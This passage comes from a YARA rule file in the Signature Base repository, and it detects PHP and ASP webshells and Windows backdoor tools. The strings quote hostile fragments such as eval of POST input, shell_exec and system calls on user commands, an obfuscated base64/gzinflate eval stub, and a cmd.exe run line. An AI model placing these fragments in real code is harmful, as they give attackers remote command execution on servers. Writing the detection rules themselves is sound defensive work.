		hash1 = "e32405e776e87e45735c187c577d3a4f98a64059"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
		$s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
		$s11 = "scrollbar-darkshadow-color: #101842;" fullword
		$s15 = "<a bookmark=\"minipanel\">" fullword
		$s16 = "background-color: #EBEAEA;" fullword
		$s18 = "color: #D5ECF9;" fullword
		$s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_10 {
    meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f52013d6-72ce-544c-a7ef-ae2a2ea87108"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7039-L7059"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0bf731edef55cde5d2ad16510fb9f1a240c1a06b535af7e13300fdbea470df74"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"

	strings:
		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
		$s12 = "else if( $mode & 0xA000 ) " fullword
		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
		$s20 = "font-size: 8pt;" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_11 {
    meta:
		description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
		author = "Florian Roth (Nextron Systems)"
		id = "590c5320-ef85-5522-94fd-4619749f7eb1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7060-L7082"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "5a559a26314ce603d6454efb71f1243bf89daed920ca2a495a51b94a4cca0045"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
		hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
		hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
		hash3 = "80aba3348434c66ac471daab949871ab16c50042"

	strings:
		$s5 = "$filename = $backupstring.\"$filename\";" fullword
		$s6 = "while ($file = readdir($folder)) {" fullword
		$s7 = "if($file != \".\" && $file != \"..\")" fullword
		$s9 = "$backupstring = \"copy_of_\";" fullword
		$s10 = "if( file_exists($file_name))" fullword
		$s13 = "global $file_name, $filename;" fullword
		$s16 = "copy($file,\"$filename\");" fullword
		$s18 = "<td width=\"49%\" height=\"142\">" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell__Findsock_Php_Findsock_Shell_Php_Reverse_Shell {
    meta:
		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "6567c8f1-bd7f-5844-b937-3db2d8eb7408"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7083-L7097"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "2459f7114482e17f087bda4b638c29e237f2f3cb5a9e41e326ed65fc1834b6be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"

	strings:
		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Generic_PHP_6 {
    meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "e61ec617-565a-5b24-82f4-3677ef379a06"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7098-L7119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7b3f2ca3cb9516ddda1b9cac2ca5eb5d9e62e1839dad041f69a3dc7a2a186897"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
		hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
		$s5 = "echo shell_exec($com);" fullword
		$s7 = "if($sertype == \"winda\"){" fullword
		$s8 = "function execute($com)" fullword
		$s12 = "echo decode(execute($cmd));" fullword
		$s15 = "echo system($com);" fullword

	condition:
		4 of them
}
rule SIGNATURE_BASE_Unpack_Injectt {
    meta:
		description = "Webshells Auto-generated - file Injectt.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "80dc3086-41a6-5e30-bbf4-463500fe5e33"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7121-L7134"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8a5d2158a566c87edc999771e12d42c5"
		logic_hash = "d8e9ed4f2604617bd6410f36ab827affa3cc6729ba996d0d9cd9c8eb0fd96533"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "%s -Run                              -->To Install And Run The Service"
		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Devpack_Fso {
    meta:
		description = "Webshells Auto-generated - file fso.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "094eeff9-0da0-5a44-a45c-f8ee57861e7a"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7135-L7147"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b37f3cde1a08890bd822a182c3a881f6"
		logic_hash = "9d071c1e2e0725091a2abe24759e6e71d78e29caa76b4fff77c44e3bb381b1a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageFSO Below -->"
		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"

	condition:
		all of them
}
rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Ssh {
    meta:
		description = "Webshells Auto-generated - file ssh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b971065-df16-5092-beff-c55608447f19"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7148-L7159"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1aa5307790d72941589079989b4f900e"
		logic_hash = "40c5a5d1d714947454f4aa9f7ed09d777cb60c23933201ac8eaf0d49452af8c6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(gzinflate(str_rot13(base64_decode('"

	condition:
		all of them
}
rule SIGNATURE_BASE_Debug_Bdoor {
    meta:
		description = "Webshells Auto-generated - file BDoor.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "0938efe7-2b6d-5749-af9a-967cca85defb"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7160-L7172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e4e8e31dd44beb9320922c5f49739955"
		logic_hash = "ed8caeb96a6fc48fe23d5db078bbb8ba5aec3c5d4ee382cbc6bc4e01630f1460"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\"
		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

	condition:
		all of them
}
rule SIGNATURE_BASE_Bin_Client {
    meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8564d787-5edc-59b0-b1ef-2f33c8a24f82"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7173-L7187"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
		logic_hash = "28ce9aa136b5d41bb580e6b5b8580d3ccbb7eeec31007e68241d23c5a0f40d40"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Recieved respond from server!!"
		$s4 = "packet door client"
		$s5 = "input source port(whatever you want):"
		$s7 = "Packet sent,waiting for reply..."

	condition:
		all of them
}
rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxshell {
    meta:
		description = "Webshells Auto-generated - file ZXshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "621ac87e-b1f8-58d7-9328-54af5ca9b605"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7188-L7200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "246ce44502d2f6002d720d350e26c288"
		logic_hash = "72eaf90551144eccb7329e0a0e05bcc955ea2bfdb37aa87e9cae7b5f5a26bea0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WPreviewPagesn"
		$s1 = "DA!OLUTELY N"

	condition:
		all of them
}
rule SIGNATURE_BASE_Rkntload {
    meta:
		description = "Webshells Auto-generated - file RkNTLoad.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fd4b1343-5fa9-5ad8-bee1-6b06b93ddfbe"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7201-L7219"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "262317c95ced56224f136ba532b8b34f"
		logic_hash = "ab767a7016318633055a85195ca2bab08a8c68222d46018aaf8772ab27a373c4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s2 = "5pur+virtu!"
		$s3 = "ugh spac#n"
		$s4 = "xcEx3WriL4"
		$s5 = "runtime error"
		$s6 = "loseHWait.Sr."
		$s7 = "essageBoxAw"
		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"

	condition:
		all of them
}
rule SIGNATURE_BASE_Binder2_Binder2 {
    meta:
		description = "Webshells Auto-generated - file binder2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "29269dc0-f2e4-56ec-ad64-0dff00e339b7"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7220-L7236"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d594e90ad23ae0bc0b65b59189c12f11"
		logic_hash = "fbe56b7d37fc7863fcf55761c0b5b671d661a713ac95f90d65b79eee9a447a9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "IsCharAlphaNumericA"
		$s2 = "WideCharToM"
		$s4 = "g 5pur+virtu!"
		$s5 = "\\syslog.en"
		$s6 = "heap7'7oqk?not="
		$s8 = "- Kablto in"

	condition:
		all of them
}
rule SIGNATURE_BASE_Thelast_Orice2 {
    meta:
		description = "Webshells Auto-generated - file orice2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "968cef9e-0163-5f4a-91e3-07510f9f4fcd"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7237-L7249"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aa63ffb27bde8d03d00dda04421237ae"
		logic_hash = "075f3377a9b90c6c1ba74682415b9c0832a839afe647fa6d3c85d4e987618405"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " $aa = $_GET['aa'];"
		$s1 = "echo $aa;"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Sincap {
    meta:
		description = "Webshells Auto-generated - file sincap.php"
		author = "Florian Roth (Nextron Systems)"
		id = "fcee20a3-e71b-5f69-ac67-8660fd270703"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7250-L7262"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
		logic_hash = "705030e93248f5ea6744f78bd7a1816aaa9772880059286b8d686e05b193d4a0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="

	condition:
		all of them
}
rule SIGNATURE_BASE_Phpshell {
    meta:
		description = "Webshells Auto-generated - file PhpShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "887264d3-5704-5e38-b0a6-44d529258ea2"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7263-L7274"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "539baa0d39a9cf3c64d65ee7a8738620"
		logic_hash = "95b3cedac370bf9b06092035a738722f3ec97e6cbafe3d4f742429a865576ad8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Devpack_Config {
    meta:
		description = "Webshells Auto-generated - file config.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "da1b8ce1-8b17-53f6-a86b-ad3fe918084e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7275-L7288"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b41d0e64e64a685178a3155195921d61"
		logic_hash = "b2806c30db413bca518943352f233c9d2915356a41eceed5e352b88ee34fbbd3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "const adminPassword=\""
		$s2 = "const userPassword=\""
		$s3 = "const mVersion="

	condition:
		all of them
}
rule SIGNATURE_BASE_Sendmail {
    meta:
		description = "Webshells Auto-generated - file sendmail.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd33c2bb-61bf-57b7-82b9-d864097f7a56"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7289-L7301"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "75b86f4a21d8adefaf34b3a94629bd17"
		logic_hash = "bcca9a9380d2695bc277afc9fa72c24cb26ac44c6fbcc87113b017cfe190bdab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "_NextPyC808"
		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Zehir4 {
    meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9f1adcd6-b721-54ef-a20f-c3a353629a40"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7302-L7313"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "6bcfb1ee40403394bf996ecbe1bb17f9afa0c3ba9e1906881b94bbc785b4a510"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = " byMesaj "

	condition:
		all of them
}
rule SIGNATURE_BASE_Hkshell_Hkshell {
    meta:
		description = "Webshells Auto-generated - file hkshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7436cd7c-7027-56dc-bb62-fac0f70c27d8"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7314-L7327"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "168cab58cee59dc4706b3be988312580"
		logic_hash = "bee4d4c957ede41c771d690d52ac2fd3655238cc1fc106d30fb2721084b38aa1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "PrSessKERNELU"
		$s2 = "Cur3ntV7sion"
		$s3 = "Explorer8"

	condition:
		all of them
}
rule SIGNATURE_BASE_Imhapftp {
    meta:
		description = "Webshells Auto-generated - file iMHaPFtp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c810c630-ce08-5059-ad49-f65b244f4d19"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7328-L7339"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "12911b73bc6a5d313b494102abcf5c57"
		logic_hash = "c24bb80a0ae4284b4303450e9103c5dda30c41b41f323641ac1175461f741ced"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"

	condition:
		all of them
}
rule SIGNATURE_BASE_Unpack_Tback {
    meta:
		description = "Webshells Auto-generated - file TBack.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b5f93621-e1e9-5aed-b574-471b4c1f9570"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7340-L7351"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a9d1007823bf96fb163ab38726b48464"
		logic_hash = "0fb43766c305f4235cc0987f411fdc3b3674723687f0b63d346429f4a7b5b87f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "\\final\\new\\lcc\\public.dll"

	condition:
		all of them
}
rule SIGNATURE_BASE_Darkspy105 {
    meta:
		description = "Webshells Auto-generated - file DarkSpy105.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d519ccf-fe52-5b82-a39d-c9f86c1089e1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7352-L7363"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
		logic_hash = "0f1c9dba4525f9c30f309500652ed6af647ddf492f483e101fc23c891e15fc85"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"

	condition:
		all of them
}
rule SIGNATURE_BASE_Editserver_EXE {
    meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97928144-0112-5288-8f95-acf7a0d56e71"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7364-L7377"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f945de25e0eba3bdaf1455b3a62b9832"
		logic_hash = "d440669b0c0bf575cf9dea946edf55f724300a4c765e90c631fc1eee062bf006"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Server %s Have Been Configured"
		$s5 = "The Server Password Exceeds 32 Characters"
		$s8 = "9--Set Procecess Name To Inject DLL"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Reader {
    meta:
		description = "Webshells Auto-generated - file reader.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "d596f7f4-5b0d-5f17-94d3-2582ec041eb1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7378-L7389"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
		logic_hash = "89a948f8da66173965884cd525615c8eeb91cf98a4984c05be7472034bb72f76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "mailto:mailbomb@hotmail."

	condition:
		all of them
}
rule SIGNATURE_BASE_ASP_Cmdasp {
    meta:
		description = "Webshells Auto-generated - file CmdAsp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e4b48843-1936-5717-b2b6-add5b4a14d04"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7390-L7403"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
		logic_hash = "84c3148fe74b1afaa6e3bbff0aca8df1f1775759a36a673cc13d35ef7658929c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "' -- Read the output from our command and remove the temp file -- '"
		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
		$s9 = "' -- create the COM objects that we will be using -- '"

	condition:
		all of them
}
rule SIGNATURE_BASE_KA_Ushell {
    meta:
		description = "Webshells Auto-generated - file KA_uShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "34e220db-2fb5-59dc-b5e8-d88f844d3977"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7404-L7416"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "685f5d4f7f6751eaefc2695071569aab"
		logic_hash = "58d25e19e2e14a909b4b623a85dfd8c62974121d3b23574d1e94b62385e42b45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
		$s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"

	condition:
		all of them
}
rule SIGNATURE_BASE_PHP_Backdoor_V1 {
    meta:
		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
		author = "Florian Roth (Nextron Systems)"
